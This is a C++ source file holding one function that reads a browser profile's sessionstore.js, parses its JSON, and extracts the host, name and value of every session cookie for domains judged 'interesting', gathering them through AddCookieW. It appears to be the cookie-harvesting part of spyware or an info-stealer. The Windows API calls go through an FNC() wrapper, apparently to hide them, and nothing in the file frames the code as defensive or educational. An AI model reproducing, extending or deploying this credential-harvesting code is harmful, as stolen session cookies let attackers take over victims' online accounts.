int DumpSessionCookies(WCHAR *profilePath)
{
	char *session_memory = NULL;
	DWORD session_size;
	HANDLE h_session_file;
	JSONValue *value;
	JSONObject root;
	WCHAR sessionPath[MAX_PATH];
	WCHAR *host = NULL, *name = NULL, *cvalue = NULL;
	DWORD n_read = 0;

	swprintf_s(sessionPath, MAX_PATH, L"%s\\sessionstore.js", profilePath);
	h_session_file = FNC(CreateFileW)(sessionPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (h_session_file == INVALID_HANDLE_VALUE)
		return 0;
	session_size = GetFileSize(h_session_file, NULL);
	if (session_size == INVALID_FILE_SIZE || session_size == 0) {
		CloseHandle(h_session_file);
		return 0;
	}
	session_memory = (char *)malloc(session_size + sizeof(WCHAR));
	if (!session_memory) {
		CloseHandle(h_session_file);
		return 0;
	}
	memset(session_memory, 0, session_size + sizeof(WCHAR));
	if (!ReadFile(h_session_file, session_memory, session_size, &n_read, NULL)) {
		CloseHandle(h_session_file);
		SAFE_FREE(session_memory);
		return 0;
	}
	CloseHandle(h_session_file);
	if (n_read != session_size) {
		SAFE_FREE(session_memory);
		return 0;
	}
	value = JSON::Parse(session_memory);
	if (!value) {
		SAFE_FREE(session_memory);
		return 0;
	}
	if (value->IsObject() == false) {
		delete value;
		SAFE_FREE(session_memory);
		return 0;
	}
	root = value->AsObject();

	if (root.find(L"windows") != root.end() && root[L"windows"]->IsArray()) {
		JSONArray jwindows = root[L"windows"]->AsArray();
		for (unsigned int i = 0; i < jwindows.size(); i++) {
			if (jwindows[i]->IsObject()) {
				JSONObject jtabs = jwindows[i]->AsObject();
				if (jtabs.find(L"cookies") != jtabs.end() && jtabs[L"cookies"]->IsArray()) {
					JSONArray jcookiearray = jtabs[L"cookies"]->AsArray();
					for (unsigned int j = 0; j < jcookiearray.size(); j++) {
						if (jcookiearray[j]->IsObject()) {
							JSONObject jcookie = jcookiearray[j]->AsObject();
							if (jcookie.find(L"host") != jcookie.end() && jcookie[L"host"]->IsString()) 
								host = _wcsdup(jcookie[L"host"]->AsString().c_str());
							if (jcookie.find(L"name") != jcookie.end() && jcookie[L"name"]->IsString()) 
								name = _wcsdup(jcookie[L"name"]->AsString().c_str());
							if (jcookie.find(L"value") != jcookie.end() && jcookie[L"value"]->IsString()) 
								cvalue = _wcsdup(jcookie[L"value"]->AsString().c_str());

							NormalizeDomainW(host);
							if (host && name && cvalue && IsInterestingDomainW(host))
								AddCookieW(host, name, cvalue);

							SAFE_FREE(host);
							SAFE_FREE(name);
							SAFE_FREE(cvalue);
						}
					}
				}
			}
		}
	}	
	delete value;
	SAFE_FREE(session_memory);
	return 1;
}